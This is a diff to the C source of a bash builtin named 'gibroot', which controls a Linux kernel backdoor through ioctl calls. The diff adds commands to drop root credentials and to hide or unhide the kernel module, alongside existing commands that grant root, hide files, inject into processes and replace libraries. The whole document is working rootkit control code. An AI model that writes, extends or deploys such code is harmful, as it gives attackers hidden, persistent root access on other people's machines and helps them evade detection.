@@ -22,12 +22,15 @@ $END
 #include "../../bdoor_common.h"
 
 #define ROOT_CMD "root"
+#define UNROOT_CMD "unroot"
 #define URAND_CMD "urand"
 #define HIDE_CMD "hide"
 #define SHOW_CMD "show"
 #define LIST_HIDDEN_CMD "list"
 #define INJECT_CMD "inject"
 #define REPLACE_CMD "replace"
+#define HIDE_MOD_CMD "hmod"
+#define SHOW_MOD_CMD "smod"
 
 static int backdoor_fd;
 
@@ -57,6 +60,23 @@ static int make_root(list) WORD_LIST *list;
 		ret = EXECUTION_SUCCESS;
 	} else {
 		perror("ERROR ROOTING USER");
+		ret = EXECUTION_FAILURE;
+	}
+	return ret;
+}
+
+static int make_unroot(list) WORD_LIST *list;
+{
+	int res;
+	int ret;
+	printf("uid before ioctl:%lu\n",getuid());
+	res = ioctl(backdoor_fd,UNROOT_IOCTL,NULL);
+	printf("uid after ioctl:%lu\n",getuid());
+	if (res == 0) {
+		printf("successfully restored user creds\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR RESTORING USER CREDS");
 		ret = EXECUTION_FAILURE;
 	}
 	return ret;
@@ -98,32 +118,66 @@ static int replace_libs(list) WORD_LIST *list;
 	return 0;
 }
 
+static int hide_mod(list) WORD_LIST *list;
+{
+	int ret;
+	int res;
+	res = ioctl(backdoor_fd,HIDE_MOD_IOCTL,NULL);
+	if (res == 0) {
+		printf("successfully hid kernel module\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR HIDING MODULE");
+		ret = EXECUTION_FAILURE;
+	}
+	return ret;
+}
+
+static int show_mod(list) WORD_LIST *list;
+{
+	int ret;
+	int res;
+	res = ioctl(backdoor_fd,SHOW_MOD_IOCTL,NULL);
+	if (res == 0) {
+		printf("successfully unhid kernel module\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR UNHIDING MODULE");
+		ret = EXECUTION_FAILURE;
+	}
+	return ret;
+}
 
 static int get_first_arg(list) WORD_LIST *list;
 {
 	char *word = list->word->word;
 	if (!strncmp(word,ROOT_CMD,strlen(ROOT_CMD))) {
 		return make_root(list->next);
+	} else if (!strncmp(word,UNROOT_CMD,strlen(UNROOT_CMD))) {
+		return make_unroot(list->next);
 	} else if (!strncmp(word,URAND_CMD,strlen(URAND_CMD))) {
 		return toggle_urandom(list->next);
 	} else if (!strncmp(word,HIDE_CMD,strlen(HIDE_CMD))) {
 		return hide_item(list->next);
 	} else if (!strncmp(word,SHOW_CMD,strlen(SHOW_CMD))) {
-                return show_item(list->next);
+		return show_item(list->next);
 	} else if (!strncmp(word,LIST_HIDDEN_CMD,strlen(LIST_HIDDEN_CMD))) {
-                return list_hidden_items(list->next);
+		return list_hidden_items(list->next);
 	} else if (!strncmp(word,INJECT_CMD,strlen(INJECT_CMD))) {
-                return inject_pid(list->next);
+		return inject_pid(list->next);
 	} else if (!strncmp(word,REPLACE_CMD,strlen(REPLACE_CMD))) {
-                return replace_libs(list->next);
+		return replace_libs(list->next);
+	} else if (!strncmp(word,HIDE_MOD_CMD,strlen(HIDE_MOD_CMD))) {
+		return hide_mod(list->next);
+	} else if (!strncmp(word,SHOW_MOD_CMD,strlen(SHOW_MOD_CMD))) {
+		return show_mod(list->next);
 	} else {
 		printf("ERROR: invalid command\n");
 		return EXECUTION_FAILURE;
 	}
 }
 
-int gibroot_builtin(list) 
-	WORD_LIST *list;
+int gibroot_builtin(list) WORD_LIST *list;
 {
 	int ret = 0;
 	if (open_device() == -1) {
@@ -135,7 +189,7 @@ int gibroot_builtin(list)
 		printf("ERROR: need at least one argument\n");
 		ret = EXECUTION_FAILURE;
 	} else {
-		ret = get_first_arg(argc,argv);
+		ret = get_first_arg(list);
 	}
 	close_device();
 out:
